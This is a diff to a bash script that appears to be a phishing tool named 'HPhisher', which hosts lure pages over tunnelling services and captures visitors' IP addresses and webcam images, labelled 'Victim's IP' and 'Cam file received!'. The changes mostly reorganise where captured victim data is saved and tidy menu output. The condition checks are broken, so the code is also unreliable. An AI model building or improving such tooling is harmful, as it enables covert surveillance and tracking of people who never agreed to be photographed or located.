@@ -27,11 +27,9 @@ server_dir="${pro_dir}/.server" #server directory
 sites_dir="${pro_dir}/.sites" #sites directory
 
 #Time
-date= 'date +%d-%m-%Y'
-time_hour= date + %H
-time_minute= date + %M
-time_sec= date + %S
-time= 'date +%H-%M-%S'
+date=$(date +%d-%m-%Y)
+time=$(date +%H-%M-%S)
+logs_dir=$(date +%d-%m-%Y-%H-%M-%S)
 
 #Normal Banner
 banner(){
@@ -464,15 +462,15 @@ setup_site() {
 
 #Capture data check
 capture_data_check(){
-	      if [ site_name=image ];then
+	if [ site_name=image ];then
                 capture_data_image
         elif [ site_name=audio ];then
                 capture_data_audio
         elif [ site_name=video ];then
                 capture_data_video
-			 elif [ site_name=video ];then
-			           capture_data_video_audio
-	      else
+	elif [ site_name=video ];then
+	        capture_data_video_audio
+	else
 	    	echo " Error Occured!!"
         fi
 }
@@ -482,35 +480,30 @@ capture_ip() {
         IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
-			file_folder= "${date}-${time}"
-				mkdir /${files_dir}/${file_folder}
-        echo -ne "\n${BLUE} Saved in : ${ORANGE} ${pro_dir}/files/${site_name}/${file_folder}/ip.txt"
-	      mv /.server/www/ip.txt /${files_dir}/${file_folder}
+	logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
+	mkdir ${logs_dir}
+	mv ${logs_dir} ${files_dir}/${site_name}
+        echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}/ip.txt"
+	mv .server/www/ip.txt ${logs_full_dir}
 }
 capture_data_image() {
         echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
-  while true; do
+  	while true; do
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
-                        rm -rf .server/www/ip.txt
                 fi
                 sleep 0.75
-		shopt
+		if [[ -e ".server/www/Log.log" ]]; then
+			echo " "
+                        printf "${GREEN} Cam file received! ${NC}"
+                        rm -rf .server/www/Log.log
+			mv .server/www/*.png  ${logs_full_dir}/
+                fi
                 sleep 0.5
 	done
 }
 
-shopt() {
-			if [[ -e ".server/www/Log.log" ]]; then
-                        printf "${GREEN} Cam file received! ${NC}"
-                        rm -rf .server/www/Log.log
-                        shopt -s globstar
-                        for f in /.server/www/*.{jpg,jpeg,webp}; do
-                                mv -- "/.server/www/${f}" /${files_dir}
-                        done
-			fi
-}
 capture_data_audio() {
         echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
   while true; do
@@ -523,10 +516,7 @@ capture_data_audio() {
 		if [[ -e ".server/www/Log.log" ]]; then
                         printf "${GREEN} Cam file received! ${NC}"
                         rm -rf Log.log
-                        shopt -s globstar
-                        for f in /.server/www/*.{jpg,jpeg,webp}; do
-                        mv -- "/.server/www/${f}" /${files_dir}
-                        done
+                        mv /.server/www/*.{jpg,jpeg,webp,png} /sdcard
                 fi
                 sleep 0.5
 	done
@@ -613,11 +603,13 @@ esac
 ## Tunnel selection
 tunnel_menu() {
 echo -e " "
-echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select a port forwarding service : ${BLUE}"
-echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
-echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
-echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
-echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
+echo -e "${RED}[${WHITE}-${RED}]${GREEN}Select a port forwarding service : ${BLUE}"
+echo -e " "
+echo -e "	${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
+echo -e "	${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
+echo -e "	${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
+echo -e "	${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
+echo -e " "
 read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} : ${BLUE}" reply_tunnel
 
         case $reply_tunnel in
